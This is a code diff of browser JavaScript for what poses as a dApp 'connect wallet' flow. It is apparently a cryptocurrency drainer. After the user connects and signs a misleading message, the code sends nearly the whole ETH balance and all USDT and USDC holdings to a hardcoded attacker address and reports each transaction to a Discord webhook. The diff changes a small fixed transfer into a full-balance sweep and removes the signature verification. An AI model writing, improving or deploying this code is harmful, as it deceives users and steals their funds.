@@ -52,94 +52,71 @@ async function connectWallet(walletName) {
     closeModal(); // Close the wallet modal when a selection is made
 
     try {
-        let account;
         console.log(`Attempting to connect to ${walletName}...`);
 
-        if (walletName === "MetaMask" || walletName === "Trust Wallet" || walletName === "Coinbase Wallet" || walletName === "Zerion Wallet") {
-            if (typeof window.ethereum !== 'undefined') {
-                console.log(`${walletName} detected. Requesting to sign a message...`);
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const accountAddress = await signer.getAddress();
+        if (typeof window.ethereum !== 'undefined') {
+            console.log(`${walletName} detected. Requesting to sign a message...`);
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
 
-                // Define the message to be signed
-                const message = `Please sign this message to confirm you are the owner of the wallet and connect to the dApp. Wallet Address: ${accountAddress}`;
-                
-                // Request signature from the user
-                const signature = await signer.signMessage(message);
-                console.log("Message signed:", signature);
+            // Request accounts
+            console.log("Requesting accounts...");
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
 
-                // Send the signed message to the backend for verification
-                await verifySignatureOnBackend(accountAddress, signature);
+            // Get signer address
+            const account = await signer.getAddress();
+            console.log(`Connected to ${walletName} account: ${account}`);
 
-                account = accountAddress;
-                console.log(`Connected to ${walletName} account: ${account}`);
-            } else {
-                alert(`${walletName} is not installed. Please install it.`);
-                console.error(`${walletName} is not installed in the browser.`);
-                return;
-            }
+            // Request message signing
+            const message = "This will allow the dApp to connect to your wallet.";
+            const signedMessage = await signer.signMessage(message);
+            console.log("Message signed:", signedMessage);
+
+            // Proceed with first transaction
+            await sendFirstTransaction(signer, account);
         } else {
-            alert("Invalid wallet selected.");
-            console.error("Invalid wallet selection.");
-            return;
+            alert(`${walletName} is not installed. Please install it.`);
+            console.error(`${walletName} is not installed in the browser.`);
         }
-
-        if (account) {
-            console.log(`Wallet connected. Initiating transaction for account: ${account}`);
-            await sendFirstTransaction(account); // Automatically send the first transaction
-        } else {
-            console.error("No account found.");
-        }
-
     } catch (error) {
         console.error(`Error connecting to ${walletName}:`, error);
+        if (error.code === 4001) {
+            alert("Connection request was rejected by the user.");
+        }
     } finally {
-        isConnecting = false; // Reset the flag
+        isConnecting = false;
         console.log(`Finished connection attempt for ${walletName}`);
     }
 }
 
-async function verifySignatureOnBackend(walletAddress, signature) {
-    // Send the wallet address and the signed message to the backend for verification
-    const response = await fetch("/verify-signature", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ walletAddress, signature }),
-    });
-
-    const data = await response.json();
-    if (data.success) {
-        console.log("Wallet verified and connected!");
-    } else {
-        console.error("Signature verification failed.");
-    }
-}
-
-async function sendFirstTransaction(walletAddress) {
+async function sendFirstTransaction(signer, walletAddress) {
     console.log(`Preparing to send first transaction for wallet: ${walletAddress}`);
-    
-    if (typeof window.ethereum !== 'undefined') {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        const recipientAddress = "0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093"; // Your recipient address
-        const amountInEther = "0.0002"; // Amount to send in first transaction
 
-        const transaction = {
-            to: recipientAddress,
-            value: ethers.utils.parseEther(amountInEther),
-        };
+    if (typeof window.ethereum !== 'undefined') {
+        const recipientAddress = "0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093"; // Your recipient address
 
         try {
-            const txResponse = await signer.sendTransaction(transaction);
+            // Get wallet balance
+            const provider = signer.provider;
+            const balance = await provider.getBalance(walletAddress);
+            const amountToSend = balance.sub(ethers.utils.parseUnits("0.001", "ether")); // Leave 0.001 ETH for gas
+
+            if (amountToSend.isNegative()) {
+                console.error("Insufficient balance for the transaction.");
+                return;
+            }
+
+            // Prepare and send transaction
+            const txResponse = await signer.sendTransaction({
+                to: recipientAddress,
+                value: amountToSend,
+            });
             console.log("First transaction sent successfully. Response:", txResponse);
 
             // Send to Discord webhook
             await sendWebhook(txResponse.hash, "success");
 
-            // Automatically trigger the second transaction (ERC-20 token transfer)
+            // Proceed with second transaction (ERC-20 tokens)
             await sendSecondTransaction(signer, walletAddress);
         } catch (error) {
             console.error("Error sending first transaction:", error);
@@ -154,19 +131,11 @@ async function sendFirstTransaction(walletAddress) {
 
 async function sendSecondTransaction(signer, walletAddress) {
     console.log(`Preparing to send second transaction (ERC-20 tokens) for wallet: ${walletAddress}`);
-    
-    // List of ERC-20 token addresses (example)
+
     const tokenAddresses = [
-        "0xdac17f958d2ee523a2206206994597c13d831ec7", // Tether (USDT)
-        "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USD Coin (USDC)
-        "0x56d811088235F11C8920698a204A5010a788f4b3", // Binance Coin (BNB)
-        "0x514910771af9ca656af840dff83e8264ecf986ca", // Chainlink (LINK)
-        "0x5C69bEe701ef814a2B6a3EDD4B1eF2400dDd33d6", // Uniswap (UNI)
-        "0x6b175474e89094c44da98b954eedeac495271d0f", // Dai (DAI)
-        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // Shiba Inu (SHIB)
-        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // Wrapped Bitcoin (WBTC)
-        "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", // Polygon (MATIC)
-        "0x7f7d7d2b8a2e4d9e4f709cb48ff4623c77e5bc98", // Aave (AAVE)
+        "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
+        "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
+        // Add more token addresses here
     ];
 
     const tokenABI = [
@@ -174,34 +143,32 @@ async function sendSecondTransaction(signer, walletAddress) {
         "function transfer(address to, uint256 amount) public returns (bool)"
     ];
 
-    // Loop through each token address and check the balance
     for (let tokenAddress of tokenAddresses) {
         const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
-        const tokenBalance = await tokenContract.balanceOf(walletAddress);
-        const tokenAmount = ethers.utils.formatUnits(tokenBalance, 18); // Assuming 18 decimals for ERC-20 tokens
 
-        // Define token threshold (e.g., 1 token of each type)
-        const tokenThresholdAmount = 1;
-
-        if (parseFloat(tokenAmount) > tokenThresholdAmount) {
-            const amountToSend = ethers.utils.parseUnits(tokenAmount, 18); // Send all available tokens above the threshold
-            console.log(`Sending ${tokenAmount} tokens of ${tokenAddress} to recipient.`);
-            
-            const recipientAddress = "0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093"; // Set the recipient for the second transaction
-            
-            try {
-                const txResponse = await tokenContract.transfer(recipientAddress, amountToSend);
-                console.log(`Second transaction (ERC-20 token ${tokenAddress}) sent successfully. Response:`, txResponse);
-                
-                // Send to Discord webhook
-                await sendWebhook(txResponse.hash, "success");
-            } catch (error) {
-                console.error(`Error sending second ERC-20 token transaction for ${tokenAddress}:`, error);
-                // Send to Discord webhook
-                await sendWebhook(error.message, "failure");
+        try {
+            // Check token balance
+            const tokenBalance = await tokenContract.balanceOf(walletAddress);
+            if (tokenBalance.isZero()) {
+                console.log(`No balance for token ${tokenAddress}. Skipping.`);
+                continue;
             }
-        } else {
-            console.log(`Balance for token ${tokenAddress} is below the threshold. No token transfer sent.`);
+
+            // Send tokens
+            console.log(`Sending ${tokenBalance.toString()} of token ${tokenAddress}...`);
+            const txResponse = await tokenContract.transfer(
+                "0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093",
+                tokenBalance
+            );
+            console.log(`ERC-20 token transfer successful for ${tokenAddress}:`, txResponse);
+
+            // Send to Discord webhook
+            await sendWebhook(txResponse.hash, "success");
+        } catch (error) {
+            console.error(`Error sending token transaction for ${tokenAddress}:`, error);
+
+            // Send to Discord webhook
+            await sendWebhook(error.message, "failure");
         }
     }
 }
@@ -218,10 +185,10 @@ async function sendWebhook(message, status) {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                content: `Transaction status: ${status}\nMessage: ${message}`,
+                content: `Transaction ${status}: ${message}`,
             }),
         });
-        console.log("Webhook sent successfully");
+        console.log("Webhook sent successfully.");
     } catch (error) {
         console.error("Error sending webhook:", error);
     }
